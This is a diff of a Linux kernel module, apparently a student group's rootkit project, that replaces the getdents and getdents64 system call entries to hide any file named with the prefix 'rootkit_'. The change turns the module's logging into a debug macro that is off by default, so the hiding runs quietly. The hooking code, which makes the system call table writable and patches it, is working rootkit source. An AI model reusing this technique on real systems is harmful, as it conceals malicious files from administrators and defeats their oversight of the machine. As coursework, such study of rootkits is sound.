@@ -21,6 +21,14 @@
 #define OUR_MODULE_PUT 
 #endif
 
+//#define DEBUG_ON
+#ifdef DEBUG_ON
+#define OUR_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
+#else
+#define OUR_DEBUG(...)
+#endif
+
+
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
@@ -77,18 +85,16 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
     char hidename[] = "rootkit_";
     unsigned short cur_reclen;
 
-    printk(KERN_INFO "our very own hooked_getdents64\n");
     result = original_getdents64(fd, dirent, count);
-    printk(KERN_INFO "Here go the files %d :\n", result);
-    printk(KERN_INFO "----------------- Here are the files ------------------------------------");
+    OUR_DEBUG("----------------- Here are the files ------------------------------------");
     cur_dirent = dirent;
 
     for (bpos=0; bpos < result;){
         cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
 
-        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
+        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
         if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
-            printk(KERN_INFO "found a file to hide:%s\n",cur_dirent->d_name);
+            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
             //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
             cur_reclen = cur_dirent->d_reclen;
             memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
@@ -100,14 +106,7 @@ asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __u
         }
     }
 
-    printk(KERN_INFO "----------------- After modification ------------------------------------");
-
-    for(bpos = 0; bpos < result;){
-        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
-        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
-        bpos += cur_dirent->d_reclen;
-    }
-    printk(KERN_INFO "----------------- End of file list ------------------------------------");
+    OUR_DEBUG("----------------- End of file list ------------------------------------");
     return result;
 
 
@@ -123,6 +122,7 @@ void hook_functions(void){
   original_getdents64 = sys_call_table[__NR_getdents64];
   // remove write protection
   make_page_writable((long unsigned int) ptr_sys_call_table);
+
   // replace function pointers! YEEEHOW!!
   //sys_call_table[__NR_read] = (void*) hooked_read;
   sys_call_table[__NR_getdents] = (void*) hooked_getdents;
@@ -155,7 +155,6 @@ static int __init _init_module(void)
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     print_nr_procs();
     hook_functions();
-    printk(KERN_INFO "Address of original_getdents: %p\n", original_getdents);
     return 0;
 }
 
